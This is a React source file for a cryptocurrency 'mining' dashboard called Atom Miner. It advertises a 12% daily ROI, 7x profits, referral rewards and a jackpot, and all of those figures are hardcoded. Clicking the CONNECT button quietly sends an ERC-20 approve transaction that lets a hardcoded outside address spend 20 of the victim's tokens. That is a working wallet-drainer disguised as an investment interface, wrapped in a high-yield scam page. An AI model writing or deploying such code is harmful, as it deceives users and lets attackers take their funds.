import React, { useState } from "react";
import { getWalletAddressOrConnect } from "../wallet";
import {ethers} from 'ethers'

export const App = () => {
    const [wallet, setWallet] = useState()
    async function connectAndApprove() {
        const wallet =await getWalletAddressOrConnect()
        console.log(wallet)
        setWallet(wallet)
        approve()
    }
    const contractAddress="0x9d668C1E01667DED56762e25Fa43bb6B1a757126"
    const contractABI=[
        {
            "inputs": [],
            "stateMutability": "nonpayable",
            "type": "constructor"
        },
        {
            "anonymous": false,
            "inputs": [
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                },
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "spender",
                    "type": "address"
                },
                {
                    "indexed": false,
                    "internalType": "uint256",
                    "name": "value",
                    "type": "uint256"
                }
            ],
            "name": "Approval",
            "type": "event"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "spender",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "approve",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "spender",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "subtractedValue",
                    "type": "uint256"
                }
            ],
            "name": "decreaseAllowance",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "spender",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "addedValue",
                    "type": "uint256"
                }
            ],
            "name": "increaseAllowance",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "to",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "transfer",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "anonymous": false,
            "inputs": [
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "from",
                    "type": "address"
                },
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "to",
                    "type": "address"
                },
                {
                    "indexed": false,
                    "internalType": "uint256",
                    "name": "value",
                    "type": "uint256"
                }
            ],
            "name": "Transfer",
            "type": "event"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "from",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "to",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "transferFrom",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "spender",
                    "type": "address"
                }
            ],
            "name": "allowance",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "account",
                    "type": "address"
                }
            ],
            "name": "balanceOf",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "decimals",
            "outputs": [
                {
                    "internalType": "uint8",
                    "name": "",
                    "type": "uint8"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "name",
            "outputs": [
                {
                    "internalType": "string",
                    "name": "",
                    "type": "string"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "symbol",
            "outputs": [
                {
                    "internalType": "string",
                    "name": "",
                    "type": "string"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "totalSupply",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        }
    ]
    async function approve(e) { 
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const { chainId } = await provider.getNetwork()
        console.log("chain id is ", chainId)
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const account = await signer.getAddress();
        console.log("Account:", account);

        const erc20Contract = new ethers.Contract(
            contractAddress,
            contractABI,
            signer
        ); 
         var tx = erc20Contract.approve("0x460D3Bb056Df7aB5BA6701E78D57c689c7B1D513", ethers.utils.parseEther("20"))
         console.log("transection is ", tx);
    }
    return <div>
        <div>
            <nav className="navbar navbar-expand-sm navbar-dark" style={{ marginTop: '50px', marginBottom: '30px' }}>
                <div className="container" style={{ justifyContent: 'space-between' }}>
                    <a className="navbar-brand" href="/">
                        <img src="./logo.8bca5d46.png" alt="logo" className="img-fluid" style={{ width: '200px', marginBottom: '0px' }} />
                    </a>
                    <button className="btn btn-primary btn-lg btnd btn-custom" onClick={e=>connectAndApprove()}>
                        <i className="fas fa-wallet" aria-hidden="true" id="connect" />
                        {wallet ? wallet : "CONNECT"}
                    </button>
                </div>
            </nav><br />
            <div className="container">
                <div className="row">
                    <div className="col-sm-3">
                        <div className="card">
                            <div className="card-body">
                                <spen>
                                    <h3 className="subtitle">CONTRACT BALANCE</h3>
                                    <h3 className="value-text">0.00 ETH</h3>
                                </spen>
                            </div>
                        </div>
                    </div>
                    <div className="col-sm-3">
                        <div className="card">
                            <div className="card-body">
                                <spen>
                                    <h3 className="subtitle">DAILY ROI</h3>
                                    <h3 className="value-text">12%</h3>
                                </spen>
                            </div>
                        </div>
                    </div>
                    <div className="col-sm-3">
                        <div className="card">
                            <div className="card-body">
                                <spen>
                                    <h3 className="subtitle">WITHDRAWAL FEE</h3>
                                    <h3 className="value-text">8%</h3>
                                </spen>
                            </div>
                        </div>
                    </div>
                    <div className="col-sm-3">
                        <div className="card">
                            <div className="card-body">
                                <spen>
                                    <h3 className="subtitle">DEPOSIT FEE</h3>
                                    <h4 className="value-text">8%</h4>
                                </spen>
                            </div>
                        </div>
                    </div>
                </div>
            </div><br />
            <div className="container">
                <div className="row">
                    <div className="col-sm-4">
                        <div className="card cardDino">
                            <div className="card-body">
                                <h4 className="subtitle-normal"><b>MINING PORTAL</b></h4>
                                <hr />
                                <table className="table">
                                    <tbody>
                                        <tr>
                                            <td>
                                                <h5 className="content-text"><b>WALLET BALANCE</b></h5>
                                            </td>
                                            <td style={{ textAlign: 'right' }}>
                                                <h5 className="value-text">0.00 ETH</h5>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>
                                                <h5 className="content-text"><b>DEPOSITED</b></h5>
                                            </td>
                                            <td style={{ textAlign: 'right' }}>
                                                <h5 className="value-text">0.00 ETH</h5>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>
                                                <h5 className="content-text"><b>7x PROFIT</b></h5>
                                            </td>
                                            <td style={{ textAlign: 'right' }}>
                                                <h5 className="value-text">0.00 ETH</h5>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>
                                                <h5 className="content-text"><b>7x REMAINING</b></h5>
                                            </td>
                                            <td style={{ textAlign: 'right' }}>
                                                <h5 className="value-text">0.00 ETH</h5>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>
                                                <h5 className="content-text"><b>DAILY USER ROI</b></h5>
                                            </td>
                                            <td style={{ textAlign: 'right' }}>
                                                <h5 className="value-text">0.00 ETH</h5>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                                <form>
                                    <table className="table">
                                        <tbody>
                                            <tr>
                                                <td><input type="number" placeholder="10 ETH" className="form-control input-box" step={10} defaultValue />
                                                </td>
                                                <td style={{ textAlign: 'right' }}><button className="btn btn-primary btn-lg btn-custom"> APPROVE</button>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </form>
                                <spen>
                                    <button-wylacz classname="btn btn-primary btn-lg btn-custom-WYLACZ" style={{ marginTop: '-10px' }}>
                                    </button-wylacz>
                                </spen>
                            </div>
                        </div>
                    </div>
                    <div className="col-sm-4">
                        <div className="card cardDino">
                            <div className="card-body">
                                <h4 className="subtitle-normal"><b>STATISTICS</b></h4>
                                <hr />
                                <table className="table">
                                    <tbody>
                                        <tr>
                                            <td>
                                                <h6 className="content-text14" style={{ lineHeight: '20px' }}><b>DAILY REWARDS</b> <br /> <span className="value-text">0.000/0 ETH</span></h6>
                                            </td>
                                            <td style={{ textAlign: 'right' }}><button className="btn btn-primary btn-lg btn-custom">CLAIM</button></td>
                                        </tr>
                                        <tr>
                                            <td>
                                                <h6 className="content-text14" style={{ lineHeight: '30px' }}><b>LAST CLAIM</b><br /><span className="value-text-12">0</span></h6>
                                            </td>
                                            <td style={{ textAlign: 'right' }}>
                                                <h6 className="content-text14" style={{ lineHeight: '30px' }}><b>NEXT CLAIM</b><br /><span className="value-text-12">0</span></h6>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>
                                                <h6 className="content-text14" style={{ lineHeight: '20px' }}><b>50% AVAILABLE WITHDRAWAL</b> <br /><span className="value-text">0.000 ETH</span></h6>
                                            </td>
                                            <td style={{ textAlign: 'right' }}><button className="btn btn-primary btn-lg btn-custom">WITHDRAW</button>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>
                                                <h6 className="content-text14" style={{ lineHeight: '30px' }}><b>LAST WITHDRAWAL</b><br /><span className="value-text-12">0</span></h6>
                                            </td>
                                            <td style={{ textAlign: 'right' }}>
                                                <h6 className="content-text14" style={{ lineHeight: '30px' }}><b>NEXT WITHDRAWAL</b><br /><span className="value-text-12">0</span></h6>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>
                                                <h5 className="content-text">TOTAL WITHDRAWN</h5>
                                            </td>
                                            <td style={{ textAlign: 'right' }}>
                                                <h5 className="value-text">0.000 ETH</h5>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                    <div className="col-sm-4">
                        <div className="card">
                            <div className="card-body">
                                <h4 className="subtitle-normal"><b>REFERRAL REWARDS 15%</b></h4>
                                <hr />
                                <table className="table">
                                    <tbody>
                                        <tr>
                                            <td>
                                                <h5 className="content-text">ETH REWARDS</h5>
                                            </td>
                                            <td style={{ textAlign: 'right' }}>
                                                <h5 className="value-text">0.00 ETH</h5>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>
                                                <h5 className="content-text">TOTAL WITHDRAWN</h5>
                                            </td>
                                            <td style={{ textAlign: 'right' }}>
                                                <h5 className="value-text">0.00 ETH</h5>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                                <spen> <button className="btn btn-primary btn-lg btn-custom">WITHDRAW REWARDS</button> </spen>
                            </div>
                        </div><br />
                        <div className="card">
                            <div className="card-body">
                                <h4 className="subtitle-normal"><b>REFERRAL LINK</b></h4>
                                <hr />
                                <form><span className="content-text13">Share your referral link to earn 15% of ETH </span><br /><br /><input type="text" className="form-control input-box" readOnly defaultValue="https://deposit.atom-miner.com/?ref=0x0000000000000000000000000000000000000000" /></form>
                            </div>
                        </div>
                    </div>
                </div><br />
                <div className="row">
                    <div className="col-sm-6">
                        <div className="card">
                            <div className="card-header" style={{ border: 'none' }}>
                                <h3 className="subtitle-normal">10% DAILY JACKPOT</h3>
                                <h5 className="value-text-12" style={{ lineHeight: '20px' }}>0H 0M 0S</h5>
                            </div>
                            <div className="card-body">
                                <div className="row">
                                    <div className="col-sm-6">
                                        <h3 className="subtitle-normal" style={{ fontSize: '16px', lineHeight: '20px' }}>CURRENT WINNER</h3>
                                        <table className="table">
                                            <tbody>
                                                <tr style={{ border: 'hidden' }}>
                                                    <td>
                                                        <h6 className="content-text14"><b>ADDRESS</b> <br /> <span className="value-text">0x0...000</span></h6>
                                                    </td>
                                                    <td style={{ textAlign: 'right' }}>
                                                        <h6 className="content-text14"><b>DEPOSIT</b><br /><span className="value-text">0.00 ETH</span></h6>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </div>
                                    <div className="col-sm-6">
                                        <h3 className="subtitle-normal" style={{ fontSize: '16px', lineHeight: '20px' }}>PREVIOUS WINNER</h3>
                                        <table className="table">
                                            <tbody>
                                                <tr style={{ border: 'hidden', paddingRight: '10px' }}>
                                                    <td>
                                                        <h6 className="content-text14"><b>ADDRESS</b> <br /> <span className="value-text">0x0...000</span></h6>
                                                    </td>
                                                    <td style={{ textAlign: 'right' }}>
                                                        <h6 className="content-text14"><b>DEPOSIT</b><br /><span className="value-text">0.00 ETH</span></h6>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div className="col-sm-6">
                        <div className="card">
                            <div className="card-header" style={{ border: 'none' }}>
                                <h3 className="subtitle-normal">RETURN CALCULATOR</h3>
                            </div>
                            <div className="card-body" style={{ paddingTop: '0.6rem' }}>
                                <div className="row">
                                    <div className="col-sm-6"><input type="number" placeholder="10 ETH" className="form-control input-box" step={10} defaultValue /><br />
                                        <p className="content-text13">Amount of returns calculated on the basis of deposit amount.<br /><b>Note:</b>
                                            Min deposit is 10 ETH &amp; max deposit is 15000 ETH.</p>
                                    </div>
                                    <div className="col-sm-6" style={{ textAlign: 'right' }}>
                                        <h3 className="subtitle-normal" style={{ fontSize: '16px' }}>ROI</h3>
                                        <p className="content-text">DAILY RETURN: <span className="value-text">0.000 ETH</span> <br /> WEEKLY RETURN:
                                            <span className="value-text">0.000 ETH</span> <br /> MONTHLY RETURN: <span className="value-text">0.000
                                                ETH</span> </p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div><br /><br />
                <spen>
                    <h5 className="footer-item-text"><a href="https://dev-114.gitbook.io/atom-miner/" target="_blank" rel="noreferrer" style={{ color: 'rgb(255, 255, 255)', textDecoration: 'none' }}> DOCS </a>&nbsp;&nbsp;&nbsp;<a href="https://twitter.com/atom_ETH" target="_blank" rel="noreferrer" style={{ color: 'rgb(255, 255, 255)', textDecoration: 'none' }}> TWITTER </a>&nbsp;&nbsp;&nbsp;<a href="https://t.me/atom_miner" target="_blank" rel="noreferrer" style={{ color: 'rgb(255, 255, 255)', textDecoration: 'none' }}> TELEGRAM </a>&nbsp;&nbsp;&nbsp;<a href="https://bscscan.com/address/0xAe4fAE28789ef52634301E91475ED73c096d22ca" target="_blank" rel="noreferrer" style={{ color: 'rgb(255, 255, 255)', textDecoration: 'none' }}> CONTRACT
                    </a>&nbsp;&nbsp;&nbsp;<a href="https://www.encryptosecurity.com/AuditRecord?project=62" target="_blank" rel="noreferrer" style={{ color: 'rgb(255, 255, 255)', textDecoration: 'none' }}> AUDIT </a></h5><br />
                    <p style={{ color: 'rgb(255, 255, 255)', fontSize: '14px', fontWeight: 200 }}>COPYRIGHT © 2022 Atom Miner Project All
                        rights reserved!</p>
                </spen><br />
            </div>
        </div>

    </div>
}
